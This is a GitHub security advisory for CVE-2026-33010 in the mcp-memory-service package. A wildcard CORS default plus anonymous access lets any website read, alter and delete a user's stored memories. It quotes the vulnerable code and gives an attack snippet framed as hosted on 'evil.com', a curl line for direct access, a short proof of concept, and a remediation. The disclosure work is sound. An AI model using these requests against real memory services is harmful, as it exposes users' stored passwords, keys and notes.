# [H] mcp-memory-service's Wildcard CORS with Credentials Enables Cross-Origin Memory Theft

## Summary
Severity: High
Advisory: GHSA-g9rg-8vq5-mpwm
CVE: CVE-2026-33010
CWE: CWE-942
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-03-07
Source: https://github.com/advisories/GHSA-g9rg-8vq5-mpwm
Type: github-advisory

## Affected
- PyPI: `mcp-memory-service` — affected >=0 <10.25.1

## Details
### Summary
When the HTTP server is enabled (`MCP_HTTP_ENABLED=true`), the application configures FastAPI's CORSMiddleware with `allow_origins=['*']`, `allow_credentials=True`, `allow_methods=["*"]`, and `allow_headers=["*"]`. The wildcard `Access-Control-Allow-Origin: *` header permits any website to read API responses cross-origin. When combined with anonymous access (`MCP_ALLOW_ANONYMOUS_ACCESS=true`) - the simplest way to get the HTTP dashboard working without OAuth - no credentials are needed, so any malicious website can silently read, modify, and delete all stored memories.


### Details
### Vulnerable Code

**`config.py:546` - Wildcard CORS origin default**

```python
CORS_ORIGINS = os.getenv('MCP_CORS_ORIGINS', '*').split(',')
```

This produces `['*']` by default, allowing any origin.

**`app.py:274-280` - CORSMiddleware configuration**

```python
# CORS middleware
app.add_middleware(
    CORSMiddleware,
    allow_origins=CORS_ORIGINS,        # ['*'] by default
    allow_credentials=True,             # Unnecessary for anonymous access; bad practice
    allow_methods=["*"],
    allow_headers=["*"],
)
```

### How the Attack Works

The wildcard CORS default means every API response includes `Access-Control-Allow-Origin: *`. This tells browsers to allow **any website** to read the response. When combined with anonymous access (no authentication required), the attack is straightforward:

```javascript
// Running on https://evil.com - reads victim's memories
// No credentials needed - anonymous access means the API is open
const response = await fetch('http://192.168.1.100:8000/api/memories');
const memories = await response.json();
// memories contains every stored memory - passwords, API keys, personal notes
```

The browser sends the request, the server responds with `ACAO: *`, and the browser allows the JavaScript to read the response body. No cookies, no auth headers, no credentials of any kind.

**Clarification on `allow_credentials=True`:** The advisory originally stated that Starlette reflects the `Origin` header when `allow_credentials=True` with wildcard origins. Testing with Starlette 0.52.1 shows that **actual responses return `ACAO: *`** (not the reflected origin); only preflight `OPTIONS` responses reflect the origin. Per the Fetch specification, browsers block `ACAO: *` when `credentials: 'include'` is used. However, this is irrelevant to the attack because **anonymous access means no credentials are needed** - a plain `fetch()` without `credentials: 'include'` works, and `ACAO: *` allows it.

### Two Attack Vectors

This misconfiguration enables two distinct attack paths:

**1. Cross-origin browser attack (CORS - this advisory)**
- Attacker lures victim to a malicious webpage
- JavaScript on the page reads/writes the memory service API
- Works from anywhere on the internet if the victim visits the page
- The `ACAO: *` header is what allows the browser to expose the response to the attacker's JavaScript

**2. Direct network access (compounding factor)**
- Attacker on the same network directly calls the API (`curl http://<target>:8000/api/memories`)
- No CORS involved - CORS is a browser-only restriction
- Enabled by `0.0.0.0` binding + anonymous access, independent of CORS configuration

The CORS misconfiguration specifically enables attack vector #1, extending the reach from local network to anyone who can get the victim to click a link.

### Compounding Factors

- **`HTTP_HOST = '0.0.0.0'`** - Binds to all interfaces, exposing the service to the entire network (enables attack vector #2)
- **`HTTPS_ENABLED = 'false'`** - No TLS by default, allowing passive interception
- **`MCP_ALLOW_ANONYMOUS_ACCESS`** - When enabled, no authentication is required at all. This is the key enabler: without it, the CORS wildcard alone would not allow data access (the attacker would need to forward valid credentials, which `ACAO: *` blocks)
- **`allow_credentials=True`** - Bad practice: if a future Starlette version changes to reflect origins (as some CORS implementations do), this would escalate the vulnerability by allowing credential-forwarding attacks against OAuth/API-key users
- **API key via query parameter** - `api_key` query param is cached in browser history and server logs

### Attack Scenario

1. Victim runs `mcp-memory-service` with HTTP enabled and anonymous access
2. Victim visits `https://evil.com` which includes JavaScript
3. JavaScript sends `fetch('http://<victim-ip>:8000/api/memories')` (no credentials needed)
4. Server responds with `Access-Control-Allow-Origin: *`
5. Browser allows JavaScript to read the response - attacker receives all memories
6. Attacker's script also calls DELETE/PUT endpoints to modify or destroy memories
7. Victim sees a normal web page; no indication of the attack

### Root Cause

The default value of `MCP_CORS_ORIGINS` is `*`, which allows any website to read API responses. This is a permissive default that should be restricted to the expected dashboard origin (typically `localhost`). The `allow_credentials=True` is an additional misconfiguration that doesn't currently enable the attack.


### PoC
```python
from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from starlette.testclient import TestClient

app = FastAPI()
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.get("/api/memories")
def memories():
    return [{"content": "secret memory data"}]

client = TestClient(app)

# Non-credentialed request (how the real attack works with anonymous access)
response = client.get("/api/memories", headers={"Origin": "https://evil.com"})
print(response.headers["access-control-allow-origin"])  # *
print(response.json())  # [{"content": "secret memory data"}]
# Any website can read this response because ACAO is *
```


### Impact
- **Complete cross-origin memory access**: Any website can read all stored memories when the victim has the HTTP server running with anonymous access
- **Memory tampering**: Write/delete endpoints are also accessible cross-origin, allowing memory destruction
- **Remote attack surface**: Unlike direct network access (which requires LAN proximity), the CORS vector works from anywhere on the internet - the victim just needs to visit a link
- **Silent exfiltration**: The attack is invisible to the victim; no browser warnings, no popups, no indicators

## Remediation

Replace the wildcard default with an explicit localhost origin:

```python
# In config.py  (safe default)
CORS_ORIGINS = os.getenv('MCP_CORS_ORIGINS', 'http://localhost:8000,http://127.0.0.1:8000').split(',')

# In app.py - warn on wildcard
if '*' in CORS_ORIGINS:
    logger.warning("Wildcard CORS origin detected. This allows any website to access the API. "
                    "Set MCP_CORS_ORIGINS to restrict access.")

# Also: set allow_credentials=False unless specific origins are configured
app.add_middleware(
    CORSMiddleware,
    allow_origins=CORS_ORIGINS,
    allow_credentials='*' not in CORS_ORIGINS,  # Only with explicit origins
    allow_methods=["*"],
    allow_headers=["*"],
)
```

## Affected Deployments
The vulnerability exists in the Python source code and is not mitigated by any deployment-specific configuration. Docker HTTP mode is the highest-risk deployment because it explicitly binds to `0.0.0.0`, maps the port, and does not override the wildcard CORS default.

## References
- https://github.com/doobidoo/mcp-memory-service/security/advisories/GHSA-g9rg-8vq5-mpwm
- https://nvd.nist.gov/vuln/detail/CVE-2026-33010
- https://github.com/doobidoo/mcp-memory-service
